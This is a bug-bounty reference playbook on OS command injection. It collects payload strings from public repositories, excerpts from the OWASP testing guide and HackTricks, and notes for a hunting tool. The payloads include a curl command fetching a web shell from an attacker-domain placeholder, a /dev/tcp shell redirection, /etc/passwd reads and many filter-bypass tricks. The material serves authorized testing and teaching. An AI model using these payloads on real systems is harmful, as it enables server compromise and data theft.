# Real-World Playbook — OS Command Injection

**Class:** `command-injection` · **Coverage-matrix tier:** 1 · **Hunter2:** oob_listener.py · vuln_scanner.sh · **Skill:** web2-vuln-classes
**Sources:** [reddelexc/hackerone-reports](https://github.com/reddelexc/hackerone-reports) (disclosed reports) · [Az0x7/vulnerability-Checklist](https://github.com/Az0x7/vulnerability-Checklist) (test flow) · [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) + [payloadbox](https://github.com/payloadbox) (payloads) · [OWASP WSTG](https://github.com/OWASP/wstg) + [HowToHunt](https://github.com/KathanP19/HowToHunt) + [AllAboutBugBounty](https://github.com/daffainfo/AllAboutBugBounty) + [HackTricks](https://github.com/HackTricks-wiki/hacktricks) (method)

## Real payloads
*(actual attack strings — adapt to the injection context; fire only where a real sink exists)*

### PayloadsAllTheThings
```
<?php
    $ip = $_GET['ip'];
    system("ping -c 4 " . $ip);
?>
```
```
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
...
```
```
command1; command2   # Execute command1 and then command2
command1 && command2 # Execute command2 only if command1 succeeds
command1 || command2 # Execute command2 only if command1 fails
command1 & command2  # Execute command1 in the background
command1 | command2  # Pipe the output of command1 into command2
```
```
    chrome '--gpu-launcher="id>/tmp/foo"'
```
```
    ssh '-oProxyCommand="touch /tmp/foo"' foo@foo
```
```
    psql -o'|id>/tmp/foo'
```
```
$url = "https://example.tld/" . $_GET['path'] . ".txt";
system("wget.exe -q " . escapeshellarg($url));
```
```
    # -o, --output <file>        Write to file instead of stdout
    curl http://[ATTACKER.DOMAIN.TLD]/ -o webshell.php
```
```
  original_cmd_by_server `cat /etc/passwd`
```
```
  original_cmd_by_server $(cat /etc/passwd)
```
```
  cat${IFS}/etc/passwd
  ls${IFS}-la
```
```
  {cat,/etc/passwd}
```
```
  cat</etc/passwd
  sh</dev/tcp/127.0.0.1/4242
```
```
  X=$'uname\x20-a'&&$X
```
```
  ;ls%09-al%09/home
```
```
  ping%CommonProgramFiles:~10,-18%127.0.0.1
  ping%PROGRAMFILES:~10,-5%127.0.0.1
```
```
original_cmd_by_server
ls
```
```
  $ cat /et\
  c/pa\
  sswd
```
```
  cat%20/et%5C%0Ac/pa%5C%0Asswd
```
```
echo ~+
echo ~-
```
```
{,ip,a}
{,ifconfig}
{,ifconfig,eth0}
{l,-lh}s
{,echo,#test}
{,$"whoami",}
{,/?s?/?i?/c?t,/e??/p??s??,}
```
```
swissky@crashlab:~$ echo ${HOME:0:1}
/

swissky@crashlab:~$ cat ${HOME:0:1}etc${HOME:0:1}passwd
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ echo . | tr '!-0' '"-1'
/

swissky@crashlab:~$ tr '!-0' '"-1' <<< .
/

```

## Real attacker flow / methodology
*(how real hunters approach this class step by step)*

### From OWASP WSTG (testing guide)
### Command Injection

|ID          |
|------------|
|WSTG-INJT-12|

#### Summary

This article describes how to test an application for OS command injection. The tester will try to inject an OS command through an HTTP request to the application.

OS command injection is a vulnerability that occurs when user input is directly passed to an operating system command without proper validation or sanitization. This allows the user to inject and execute arbitrary commands on the server which can lead to unauthorized data access, data corruption, and full server compromise. This vulnerability can be prevented by emphasizing security during the design and development of applications.

#### Test Objectives

- Identify and assess command injection points.
- Bypass special characters and OS commands filter.

#### How to Test

When viewing a file in a web application, the filename is often shown in the URL. Perl allows piping data from a process into an open statement. The user can simply append the Pipe symbol `|` onto the end of the filename.

Example URL before alteration:

`https://sensitive/cgi-bin/userData.pl?doc=user1.txt`

Example URL modified:

`https://sensitive/cgi-bin/userData.pl?doc=user1.txt|/bin/ls`

This will execute the command `/bin/ls`.

Appending a semicolon to the end of a URL for a .PHP page followed by an operating system command, will execute the command. `%3B` is URL encoded and decodes to semicolon

Example:

`https://sensitive/something.php?dir=%3Bcat%20/etc/passwd`

##### Example

Consider the case of an application that contains a set of documents that you can browse from the internet. If you fire up a personal proxy (such as ZAP or Burp Suite), you can obtain a POST HTTP like the following (`https://www.example.com/public/doc`):

```txt
POST /public/doc HTTP/1.1
Host: www.example.com
[...]
Referer: https://127.0.0.1/WebGoat/attack?Screen=20
Cookie: JSESSIONID=295500AD2AAEEBEDC9DB86E34F24A0A5
Authorization: Basic T2Vbc1Q9Z3V2Tc3e=
Content-Type: application/x-www-form-urlencoded
Content-length: 33

Doc=Doc1.pdf
```

In this post request, we notice how the application retrieves the public documentation. Now we can test if it is possible to add an operating system command to inject in the POST HTTP. Try the following (`https://www.example.com/public/doc`):

```txt
POST /public/doc HTTP/1.1
Host: www.example.com
[...]

*(truncated — open the source link for the full method)*

### From HackTricks (excerpt — see [HackTricks](https://github.com/HackTricks-wiki/hacktricks) for full)
### Command Injection


#### What Is Command Injection?

A **command injection** permits the execution of arbitrary operating system commands by an attacker on the server hosting an application. As a result, the application and all its data can be fully compromised. The execution of these commands typically allows the attacker to gain unauthorized access or control over the application's environment and underlying system.<sup>[[2]](#references)</sup>

##### Context

Depending on **where your input is being injected** you may need to **terminate the quoted context** (using `"` or `'`) before the commands.<sup>[[1]](#references)</sup>

#### Command Injection/Execution

```bash
#Both Unix and Windows supported
ls||id; ls ||id; ls|| id; ls || id # Execute both
ls|id; ls |id; ls| id; ls | id # Execute both (using a pipe)
ls&&id; ls &&id; ls&& id; ls && id #  Execute 2º if 1º finish ok
ls&id; ls &id; ls& id; ls & id # Execute both but you can only see the output of the 2º
ls %0A id # %0A Execute both (RECOMMENDED)
ls%0abash%09-c%09"id"%0a   # (Combining new lines and tabs)


*(truncated — open the source link for the full method)*

## Chaining — always ask "what does this unlock?"
- Blind cmd injection → OOB callback confirm → RCE
- Argument/flag injection into a CLI wrapped by the app

## Hunter2 wiring
- **Run:** `oob_listener.py · vuln_scanner.sh`
- **Skill:** `web2-vuln-classes`
- **Coverage-matrix tier:** 1 (Tier 0 = test first)
